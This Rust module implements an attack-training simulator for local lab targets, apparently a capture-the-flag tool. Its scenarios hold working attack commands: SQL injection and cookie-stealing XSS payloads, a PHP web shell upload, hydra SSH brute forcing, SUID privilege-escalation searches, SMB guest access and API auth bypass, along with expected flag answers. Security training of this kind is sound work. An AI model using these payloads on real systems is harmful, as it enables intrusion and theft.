use crate::attacks::scenarios::{scenario_target_port, AttackScenario, AttackStep};
use crate::scanner::probes::probe_open_ports;
use crate::terminal::runner;
use serde::{Deserialize, Serialize};
use tokio::net::TcpStream;
use tokio::sync::mpsc;
use tokio::time::{timeout, Duration};

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct ScenarioProbeResult {
    #[serde(rename = "scenarioId")]
    pub scenario_id: String,
    pub port: u16,
    pub reachable: bool,
    pub message: String,
    pub findings: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct AttackSession {
    #[serde(rename = "sessionId")]
    pub session_id: String,
    #[serde(rename = "scenarioId")]
    pub scenario_id: String,
    pub status: String, // "starting", "running", "paused", "completed", "failed"
    #[serde(rename = "currentStep")]
    pub current_step: usize,
    pub steps: Vec<AttackStep>,
    #[serde(rename = "flagsCaptured")]
    pub flags_captured: Vec<String>,
    pub logs: Vec<String>,
    #[serde(rename = "startTime")]
    pub start_time: String,
    #[serde(rename = "endTime")]
    pub end_time: Option<String>,
    pub score: u32,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct AttackCommand {
    pub command: String,
    pub args: Vec<String>,
}

pub struct AttackSimulator {
    scenarios: Vec<AttackScenario>,
}

impl AttackSimulator {
    pub fn new() -> Self {
        Self {
            scenarios: crate::attacks::scenarios::get_available_scenarios(),
        }
    }

    pub fn get_scenario(&self, scenario_id: &str) -> Option<&AttackScenario> {
        self.scenarios.iter().find(|s| s.id == scenario_id)
    }

    pub fn get_all_scenarios(&self) -> &[AttackScenario] {
        &self.scenarios
    }

    pub async fn start_attack(
        &self,
        scenario_id: String,
        log_tx: mpsc::UnboundedSender<String>,
    ) -> Result<AttackSession, String> {
        let _scenario = self
            .get_scenario(&scenario_id)
            .ok_or_else(|| "Scenario not found".to_string())?;

        let session_id = generate_id();
        let start_time = chrono::Utc::now().to_rfc3339();

        let steps = self.generate_attack_steps(&scenario_id)?;

        let session = AttackSession {
            session_id: session_id.clone(),
            scenario_id: scenario_id.clone(),
            status: "running".to_string(),
            current_step: 0,
            steps,
            flags_captured: Vec::new(),
            logs: Vec::new(),
            start_time,
            end_time: None,
            score: 0,
        };

        // Probe lab reachability and log real results (no scripted exploit output).
        let log_tx_clone = log_tx.clone();
        tokio::spawn(async move {
            Self::run_lab_session_setup(scenario_id, session_id, log_tx_clone).await;
        });

        Ok(session)
    }

    fn generate_attack_steps(&self, scenario_id: &str) -> Result<Vec<AttackStep>, String> {
        match scenario_id {
            "dvwa-webapp" => Ok(vec![
                AttackStep {
                    id: "step-1".to_string(),
                    name: "Reconnaissance".to_string(),
                    description: "Fingerprint the web app — real HTTP request to your lab".to_string(),
                    command: "curl -sS -D - http://127.0.0.1:8081/ -o /tmp/fulgul_recon.html && head -c 800 /tmp/fulgul_recon.html".to_string(),
                    expected_output: "login".to_string(),
                    completed: false,
                    output: None,
                },
                AttackStep {
                    id: "step-2".to_string(),
                    name: "SQL Injection".to_string(),
                    description: "Exploit SQL injection in login form".to_string(),
                    command: "curl -X POST http://localhost:8081/login -d \"username=admin' OR '1'='1&password=test\"".to_string(),
                    expected_output: "FLAG{SQL_INJECTION_MASTER_2024}".to_string(),
                    completed: false,
                    output: None,
                },
                AttackStep {
                    id: "step-3".to_string(),
                    name: "XSS Attack".to_string(),
                    description: "Inject XSS payload in search parameter".to_string(),
                    command: "curl \"http://localhost:8081/search?q=<script>alert(document.cookie)</script>\"".to_string(),
                    expected_output: "FLAG{XSS_COOKIE_STEALER}".to_string(),
                    completed: false,
                    output: None,
                },
                AttackStep {
                    id: "step-4".to_string(),
                    name: "File Upload".to_string(),
                    description: "Upload PHP shell and execute it".to_string(),
                    command: "curl -X POST -F 'file=@shell.php' http://localhost:8081/upload".to_string(),
                    expected_output: "FLAG{FILE_UPLOAD_RCE}".to_string(),
                    completed: false,
                    output: None,
                },
            ]),
            "weak-ssh" => Ok(vec![
                AttackStep {
                    id: "step-1".to_string(),
                    name: "Port Scan".to_string(),
                    description: "Verify SSH is live and grab the banner".to_string(),
                    command: "nc -zv 127.0.0.1 2222 2>&1; echo | nc -w 2 127.0.0.1 2222 2>&1 | head -1".to_string(),
                    expected_output: "open".to_string(),
                    completed: false,
                    output: None,
                },
                AttackStep {
                    id: "step-2".to_string(),
                    name: "Brute Force".to_string(),
                    description: "Brute force SSH credentials".to_string(),
                    command: "hydra -l admin -P passwords.txt localhost -s 2222 ssh".to_string(),
                    expected_output: "FLAG{SSH_BRUTE_FORCE_SUCCESS}".to_string(),
                    completed: false,
                    output: None,
                },
                AttackStep {
                    id: "step-3".to_string(),
                    name: "Privilege Escalation".to_string(),
                    description: "Find and exploit SUID binary".to_string(),
                    command: "find / -perm -4000 2>/dev/null".to_string(),
                    expected_output: "FLAG{PRIV_ESC_ROOT}".to_string(),
                    completed: false,
                    output: None,
                },
            ]),
            "smb-guest" => Ok(vec![
                AttackStep {
                    id: "step-1".to_string(),
                    name: "SMB Enumeration".to_string(),
                    description: "Enumerate SMB shares with smbclient (real RPC to lab)".to_string(),
                    command: "smbclient -L //127.0.0.1 -N -p 4450 2>&1".to_string(),
                    expected_output: "FLAG{SMB_GUEST_ACCESS}".to_string(),
                    completed: false,
                    output: None,
                },
                AttackStep {
                    id: "step-2".to_string(),
                    name: "SMB Exploit".to_string(),
                    description: "Exploit SMB vulnerability".to_string(),
                    command: "smbclient //localhost/share -N -p 4450 -c 'get flag.txt'".to_string(),
                    expected_output: "FLAG{SMB_RCE_EXPLOIT}".to_string(),
                    completed: false,
                    output: None,
                },
            ]),
            "api-endpoints" => Ok(vec![
                AttackStep {
                    id: "step-1".to_string(),
                    name: "API Discovery".to_string(),
                    description: "Hit the API root and inspect the real JSON/HTML response".to_string(),
                    command: "curl -sS -D - http://127.0.0.1:3000/api/v1/ 2>&1 | head -40".to_string(),
                    expected_output: "api".to_string(),
                    completed: false,
                    output: None,
                },
                AttackStep {
                    id: "step-2".to_string(),
                    name: "Auth Bypass".to_string(),
                    description: "Bypass authentication".to_string(),
                    command: "curl -H 'Authorization: Bearer admin' http://localhost:3000/api/v1/admin".to_string(),
                    expected_output: "FLAG{API_AUTH_BYPASS}".to_string(),
                    completed: false,
                    output: None,
                },
                AttackStep {
                    id: "step-3".to_string(),
                    name: "IDOR Exploit".to_string(),
                    description: "Exploit IDOR vulnerability".to_string(),
                    command: "curl http://localhost:3000/api/v1/users/1".to_string(),
                    expected_output: "FLAG{IDOR_VULNERABILITY}".to_string(),
                    completed: false,
                    output: None,
                },
            ]),
            _ => Err("Unknown scenario".to_string()),
        }
    }

    pub async fn probe_scenario_target(scenario_id: &str) -> Result<ScenarioProbeResult, String> {
        let port = scenario_target_port(scenario_id).ok_or_else(|| "Unknown scenario".to_string())?;
        let addr = format!("127.0.0.1:{port}");
        let reachable = timeout(Duration::from_secs(3), TcpStream::connect(&addr))
            .await
            .ok()
            .and_then(|r| r.ok())
            .is_some();

        let mut findings = Vec::new();
        let message = if reachable {
            let vulns = probe_open_ports("127.0.0.1", &[port], "Lab target").await;
            for v in &vulns {
                findings.push(format!("{} — {}", v.title, v.description));
            }
            if findings.is_empty() {
                format!("Port {port} is open. Run scenario steps to enumerate and exploit.")
            } else {
                format!("Port {port} open — {} live finding(s) from banner probes.", vulns.len())
            }
        } else {
            format!("Nothing listening on {addr}. Start your vulnerable lab container/VM first.")
        };

        Ok(ScenarioProbeResult {
            scenario_id: scenario_id.to_string(),
            port,
            reachable,
            message,
            findings,
        })
    }

    async fn run_lab_session_setup(
        scenario_id: String,
        session_id: String,
        log_tx: mpsc::UnboundedSender<String>,
    ) {
        let _ = log_tx.send(format!(
            "[{}] Live session {} — real shell commands against your lab (not simulated).",
            get_timestamp(),
            session_id
        ));

        match Self::probe_scenario_target(&scenario_id).await {
            Ok(probe) => {
                if probe.reachable {
                    let _ = log_tx.send(format!("[{}] ✓ {}", get_timestamp(), probe.message));
                    for finding in probe.findings {
                        let _ = log_tx.send(format!("[{}] FINDING: {}", get_timestamp(), finding));
                    }
                    let _ = log_tx.send(format!(
                        "[{}] Use 'Run step' on each task or type commands in the terminal — output is from real tools.",
                        get_timestamp()
                    ));
                } else {
                    let _ = log_tx.send(format!("[{}] ✗ {}", get_timestamp(), probe.message));
                }
            }
            Err(e) => {
                let _ = log_tx.send(format!("[{}] Probe error: {}", get_timestamp(), e));
            }
        }
    }

    /// Returns true when real command output satisfies the step goal.
    pub fn step_satisfied(step: &AttackStep, output: &str) -> bool {
        let out = output.trim();
        if out.is_empty() {
            return false;
        }
        let lower = out.to_lowercase();

        if lower.contains("command not found") || lower.contains("not found") && lower.contains("hydra") {
            return false;
        }
        if lower.contains("connection refused")
            || lower.contains("could not resolve host")
            || lower.contains("no route to host")
            || lower.contains("failed to connect")
        {
            return false;
        }

        if step.expected_output.contains("FLAG{") {
            return out.contains("FLAG{");
        }

        if !step.expected_output.is_empty() {
            let expected = step.expected_output.to_lowercase();
            if lower.contains(&expected) {
                return true;
            }
            // Partial match for recon-style expectations
            for token in expected.split_whitespace().filter(|t| t.len() > 4) {
                if lower.contains(token) {
                    return true;
                }
            }
        }

        // Meaningful output from a real tool (not just exit code line)
        out.len() > 12 && !lower.starts_with("(process exited")
    }

    pub fn capture_flags_from_output(output: &str, captured: &mut Vec<String>) -> u32 {
        let mut added = 0u32;
        let mut search_from = 0;
        while let Some(start) = output[search_from..].find("FLAG{") {
            let abs = search_from + start;
            if let Some(end_rel) = output[abs..].find('}') {
                let flag = output[abs..abs + end_rel + 1].to_string();
                if !captured.contains(&flag) {
                    captured.push(flag);
                    added += 100;
                }
                search_from = abs + end_rel + 1;
            } else {
                break;
            }
        }
        added
    }

    pub async fn execute_command(
        &self,
        scenario_id: &str,
        command: &str,
    ) -> Result<String, String> {
        let _ = scenario_id;
        run_shell_command(command).await
    }
}

async fn run_shell_command(command: &str) -> Result<String, String> {
    runner::run_command(command, 120).await
}

fn generate_id() -> String {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    use rand::Rng;
    let mut hasher = DefaultHasher::new();
    std::time::SystemTime::now().hash(&mut hasher);
    rand::thread_rng().gen::<u64>().hash(&mut hasher);
    format!("{:x}", hasher.finish())
}

fn get_timestamp() -> String {
    chrono::Utc::now().format("%H:%M:%S").to_string()
}

